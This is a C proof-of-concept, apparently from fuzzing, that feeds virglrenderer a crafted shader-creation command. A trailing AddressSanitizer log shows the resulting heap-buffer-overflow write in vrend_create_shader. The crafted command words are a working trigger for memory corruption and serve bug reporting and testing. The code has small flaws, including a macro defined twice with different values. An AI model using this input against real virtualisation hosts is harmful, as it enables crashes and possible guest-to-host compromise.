
#include <check.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <errno.h>
#include <sys/uio.h>
#include <virglrenderer.h>
#include <virgl_context.h>
#include <vrend_renderer.h>
#include <virgl_protocol.h>
#include "vrend_winsys_egl.h"


struct fuzzer_cookie
{
   int dummy;
};

static struct fuzzer_cookie cookie;
static const uint32_t ctx_id = 1;
static struct virgl_egl *test_egl;

static void fuzzer_write_fence(UNUSED void *opaque, UNUSED uint32_t fence) {}

static virgl_renderer_gl_context
fuzzer_create_gl_context(UNUSED void *cookie, UNUSED int scanout_idx,
                         struct virgl_renderer_gl_ctx_param *param)
{
   struct virgl_gl_ctx_param vparams;
   vparams.shared = false;
   vparams.major_ver = param->major_ver;
   vparams.minor_ver = param->minor_ver;
   return virgl_egl_create_context(test_egl, &vparams);
}

static void fuzzer_destory_gl_context(UNUSED void *cookie, virgl_renderer_gl_context ctx)
{
   virgl_egl_destroy_context(test_egl, ctx);
}

static int fuzzer_make_current(UNUSED void *cookie, UNUSED int scanout_idx,
                               virgl_renderer_gl_context ctx)
{
   return virgl_egl_make_context_current(test_egl, ctx);
}


static struct virgl_renderer_callbacks fuzzer_cbs = {
   .version = 1,
   .write_fence = fuzzer_write_fence,
   .create_gl_context = fuzzer_create_gl_context,
   .destroy_gl_context = fuzzer_destory_gl_context,
   .make_current = fuzzer_make_current,
};

static int vrend_decode_set_shader_images(struct vrend_context *ctx, const uint32_t *buf, uint32_t length);


#define PIPE_SHADER_VERTEX   0
#define PIPE_SHADER_VERTEX   5


int main(void)
{
    test_egl = virgl_egl_init(NULL, true, true);
    int cookie = 0;
    assert(test_egl);

    virgl_renderer_init(&cookie, VIRGL_RENDERER_USE_GLES|
                        VIRGL_RENDERER_USE_SURFACELESS, &fuzzer_cbs);

    int ctx_id = 1;
    int res_id = 1;
    const char *name = "fuzzctx";
    int ret = virgl_renderer_context_create(ctx_id, strlen(name), name);
  
    uint32_t cmd[4096] = {0};
    int i = 0;
    cmd[i++] = 13 << 16 | VIRGL_OBJECT_SHADER << 8 | VIRGL_CCMD_CREATE_OBJECT;
    cmd[i++] = res_id;  //  handle
    cmd[i++] = PIPE_SHADER_COMPUTE;  //  type == 0
    cmd[i++] = 0x00000000;   //  num_tokens
    cmd[i++] = 0x00e2000a;   //  offlen
    cmd[i++] = 0xe20ae2e2;   //  req_local_mem
    cmd[i++] = 0x4bff0a00;   //  shd_text
    cmd[i++] = 0xe20ae2e4;
    cmd[i++] = 0xb700e2e2;
    cmd[i++] = 0xf6f5f600;
    cmd[i++] = 0xff0a000a;
    cmd[i++] = 0x0a0ae44b;
    cmd[i++] = 0x0a0a0a09;
    cmd[i++] = 0x0a00000a;
    cmd[i++] = 0x0a040000;

    virgl_renderer_submit_cmd((void *) cmd, ctx_id, 14);

    return 1;
}

/*
==17839==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000240f1 at pc 0x0000004991f0 bp 0x7fffffff9c30 sp 0x7fffffff93f8
WRITE of size 32 at 0x6020000240f1 thread T0
[Detaching after fork from child process 17955]
    #0 0x4991ef in __asan_memcpy (/home/fuzzing/Desktop/virglrenderer-master/build/src/crash_vrend_create_shader+0x4991ef)
    #1 0x4e5d7f in vrend_create_shader /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_renderer.c:3742:6
    #2 0x4d176f in vrend_decode_create_shader /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_decode.c:125:10
    #3 0x4d176f in vrend_decode_create_object /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_decode.c:779:13
    #4 0x4cfd2a in vrend_decode_ctx_submit_cmd /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_decode.c:1699:13
    #5 0x4c961e in main /home/fuzzing/Desktop/virglrenderer-master/build/../src/crash_vrend_create_shader.c:97:5
    #6 0x7ffff79b40b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16
    #7 0x4215ad in _start (/home/fuzzing/Desktop/virglrenderer-master/build/src/crash_vrend_create_shader+0x4215ad)


*/
